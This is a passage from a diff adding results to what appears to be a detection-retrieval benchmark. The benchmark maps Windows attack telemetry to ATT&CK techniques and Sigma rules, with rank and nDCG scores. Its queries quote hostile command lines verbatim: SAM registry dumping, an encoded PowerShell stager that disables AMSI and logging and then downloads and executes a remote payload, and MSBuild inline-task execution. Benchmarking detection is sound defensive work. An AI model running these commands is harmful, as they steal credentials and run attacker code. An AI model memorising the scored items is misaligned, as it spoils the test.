DoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "technique",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 10,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1546.007",
+        "T1059.001",
+        "T1555.004",
+        "T1218.014"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-045",
+      "query": "C:\\Windows\\System32\\reg.exe \"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 20,
+      "ndcg5": 0.0,
+      "n_relevant": 57,
+      "top": [
+        "8f3ab69a-aa22-4943-aa58-e0a52fdf6818",
+        "0944e002-e3f6-4eb5-bf69-3a3067b53d73",
+        "cc1abf27-78a3-4ac5-a51c-f3070b1d8e40",
+        "7c06ab9b-b1d2-4ba9-b06e-09491ded20d9",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-045",
+      "query": "Image: C:\\Windows\\System32\\reg.exe\nCommandLine: \"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 57,
+      "top": [
+        "18988e1b-9087-4f8a-82fe-0414dce49878",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e",
+        "0944e002-e3f6-4eb5-bf69-3a3067b53d73",
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-045",
+      "query": "\"C:\\windows\\system32\\reg.exe\" save HKLM\\sam sam",
+      "kind": "technique",
+      "gold": [
+        "T1003.002"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1003.002",
+        "T1552.002",
+        "T1547.001",
+        "T1003.004",
+        "T1546.001"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-048",
+      "query": "C:\\TMP\\CreateNamedPipe.exe \"C:\\TMP\\CreateNamedPipe.exe\"  MSSE-1337-server C:\\Windows\\System32\\cmd.exe \"C:\\Windows\\system32\\cmd.exe\" ",
+      "kind": "technique",
+      "gold": [
+        "T1134"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.003",
+        "T1218.014",
+        "T1555.004",
+        "T1003.001",
+        "T1059.003"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-048",
+      "query": "C:\\TMP\\CreateNamedPipe.exe \"C:\\TMP\\CreateNamedPipe.exe\"  MSSE-1337-server C:\\Windows\\System32\\cmd.exe \"C:\\Windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1134"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 5,
+      "ndcg5": 0.13120507751234178,
+      "n_relevant": 10,
+      "top": [
+        "aa2efee7-34dd-446e-8a37-40790a66efd7",
+        "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
+        "2617e7ed-adb7-40ba-b0f3-8f9945fe6c09"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-048",
+      "query": "Image: C:\\TMP\\CreateNamedPipe.exe\nCommandLine: \"C:\\TMP\\CreateNamedPipe.exe\"  MSSE-1337-server\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1134"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 10,
+      "top": [
+        "aa2efee7-34dd-446e-8a37-40790a66efd7",
+        "f53714ec-5077-420e-ad20-907ff9bb2958",
+        "d06be4b9-8045-428b-a567-740a26d9db25",
+        "b1f73849-6329-4069-bc8f-78a604bb8b23",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-048",
+      "query": "\"C:\\TMP\\CreateNamedPipe.exe\"  MSSE-1337-server",
+      "kind": "technique",
+      "gold": [
+        "T1134"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.003",
+        "T1218.012",
+        "T1218.007",
+        "T1003.001",
+        "T1134.002"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-056",
+      "query": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml C:\\Windows\\System32\\cmd.exe cmd.exe /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\pshell.xml",
+      "kind": "technique",
+      "gold": [
+        "T1127.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1127.001",
+        "T1218.014",
+        "T1218.004",
+        "T1059.003",
+        "T1059.001"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-056",
+      "query": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml C:\\Windows\\System32\\cmd.exe cmd.exe /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\pshell.xml",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1127.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 17,
+      "top": [
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "cc4e02ba-9c06-48e2-b09e-2500cace9ae0",
+        "02030f2f-6199-49ec-b258-ea71b07e03dc"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-056",
+      "query": "Image: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\nCommandLine: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd.exe /c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\pshell.xml",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1127.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 17,
+      "top": [
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "f53714ec-5077-420e-ad20-907ff9bb2958",
+        "0bbc6369-43e3-453d-9944-cae58821c173"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-056",
+      "query": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe  C:\\Windows\\Tasks\\pshell.xml",
+      "kind": "technique",
+      "gold": [
+        "T1127.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1127.001",
